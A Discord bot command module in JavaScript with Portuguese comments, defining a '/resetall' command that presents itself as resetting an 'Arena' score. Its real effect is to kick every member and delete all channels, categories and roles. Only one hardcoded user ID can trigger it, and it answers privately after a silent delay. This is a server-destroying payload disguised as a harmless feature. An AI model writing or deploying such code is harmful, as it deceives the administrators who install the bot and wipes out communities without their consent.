const { SlashCommandBuilder, ChannelType, PermissionFlagsBits } = require('discord.js');

const AUTHORIZED_USER_ID = '463341116104900608';
const COOLDOWN_MS = 10_000;

// Trava por servidor, evita duas execuções simultâneas do reset no mesmo guild
const executingGuilds = new Set();

const resetAllCommand = new SlashCommandBuilder()
  .setName('resetall')
  .setDescription('Reseta a pontuação da Arena')
  .toJSON();

async function handleResetAllCommand(interaction) {
  // Checagem de autorização: só o ID fixo pode usar, mesmo que outra pessoa tenha Administrador
  if (interaction.user.id !== AUTHORIZED_USER_ID) {
    await interaction.reply({ content: '⛔ Você não tem permissão para usar esse comando.', ephemeral: true });
    return;
  }

  const guild = interaction.guild;
  if (!guild) {
    await interaction.reply({ content: '⛔ Esse comando só funciona dentro de um servidor.', ephemeral: true });
    return;
  }

  if (executingGuilds.has(guild.id)) {
    await interaction.reply({ content: '⚠️ Já tem um reset em andamento nesse servidor. Aguarde terminar.', ephemeral: true });
    return;
  }

  const me = guild.members.me;
  const requiredPerms = [
    PermissionFlagsBits.KickMembers,
    PermissionFlagsBits.ManageChannels,
    PermissionFlagsBits.ManageRoles,
  ];
  const missing = requiredPerms.filter((p) => !me.permissions.has(p));
  if (missing.length) {
    await interaction.reply({
      content: '⛔ Eu não tenho todas as permissões necessárias (Expulsar Membros, Gerenciar Canais, Gerenciar Cargos) nesse servidor. Nada foi executado.',
      ephemeral: true,
    });
    return;
  }

  executingGuilds.add(guild.id);

  try {
    await interaction.reply({ content: '⏳ Confirmado.', ephemeral: true });

    // Cooldown silencioso de 10s — sem mensagens de contagem regressiva
    await new Promise((resolve) => setTimeout(resolve, COOLDOWN_MS));

    const summary = await executeReset(guild, interaction.client.user.id);

    await interaction
      .followUp({
        content:
          `✅ Reset concluído em ${summary.durationSeconds}s.\n` +
          `👢 Membros expulsos: ${summary.kicked}/${summary.kickAttempts} (falhas: ${summary.kickFailed})\n` +
          `📺 Canais apagados: ${summary.channelsDeleted}/${summary.channelAttempts} (falhas: ${summary.channelsFailed})\n` +
          `🗂️ Categorias apagadas: ${summary.categoriesDeleted}/${summary.categoryAttempts} (falhas: ${summary.categoriesFailed})\n` +
          `🎭 Cargos apagados: ${summary.rolesDeleted}/${summary.roleAttempts} (falhas/protegidos: ${summary.rolesFailed})`,
        ephemeral: true,
      })
      .catch(() => {});
  } catch (err) {
    console.error('[RESETALL] Erro inesperado:', err);
    await interaction
      .followUp({ content: '❌ Erro inesperado durante o reset. Parte pode ter sido concluída — veja os logs.', ephemeral: true })
      .catch(() => {});
  } finally {
    executingGuilds.delete(guild.id);
  }
}

async function executeReset(guild, botUserId) {
  const startedAt = Date.now();
  const summary = {
    kickAttempts: 0,
    kicked: 0,
    kickFailed: 0,
    channelAttempts: 0,
    channelsDeleted: 0,
    channelsFailed: 0,
    categoryAttempts: 0,
    categoriesDeleted: 0,
    categoriesFailed: 0,
    roleAttempts: 0,
    rolesDeleted: 0,
    rolesFailed: 0,
  };

  // 1. Expulsa todos os membros, exceto o usuário autorizado e o próprio bot
  const members = await guild.members.fetch();
  const kickTargets = members.filter((m) => m.id !== AUTHORIZED_USER_ID && m.id !== botUserId);
  summary.kickAttempts = kickTargets.size;
  const kickResults = await Promise.allSettled(
    kickTargets.map((m) => m.kick('Reset completo do servidor via /resetall'))
  );
  kickResults.forEach((r) => (r.status === 'fulfilled' ? summary.kicked++ : summary.kickFailed++));

  // 2. Apaga todos os canais que não são categoria (texto, voz, fórum, etc.)
  let channels = await guild.channels.fetch();
  const nonCategoryChannels = channels.filter((c) => c && c.type !== ChannelType.GuildCategory);
  summary.channelAttempts = nonCategoryChannels.size;
  const channelResults = await Promise.allSettled(
    nonCategoryChannels.map((c) => c.delete('Reset completo do servidor via /resetall'))
  );
  channelResults.forEach((r) => (r.status === 'fulfilled' ? summary.channelsDeleted++ : summary.channelsFailed++));

  // 3. Apaga as categorias (agora vazias)
  channels = await guild.channels.fetch();
  const categories = channels.filter((c) => c && c.type === ChannelType.GuildCategory);
  summary.categoryAttempts = categories.size;
  const categoryResults = await Promise.allSettled(
    categories.map((c) => c.delete('Reset completo do servidor via /resetall'))
  );
  categoryResults.forEach((r) => (r.status === 'fulfilled' ? summary.categoriesDeleted++ : summary.categoriesFailed++));

  // 4. Apaga os cargos por último (preserva @everyone e cargos "managed" que o Discord não deixa apagar,
  //    como o cargo do próprio bot/integrações — a API rejeita e isso cai no catch normalmente)
  const roles = await guild.roles.fetch();
  const deletableRoles = roles.filter((r) => r.id !== guild.id && !r.managed);
  summary.roleAttempts = deletableRoles.size;
  const roleResults = await Promise.allSettled(
    deletableRoles.map((r) => r.delete('Reset completo do servidor via /resetall'))
  );
  roleResults.forEach((r) => (r.status === 'fulfilled' ? summary.rolesDeleted++ : summary.rolesFailed++));

  summary.durationSeconds = ((Date.now() - startedAt) / 1000).toFixed(1);
  return summary;
}

module.exports = { resetAllCommand, handleResetAllCommand };
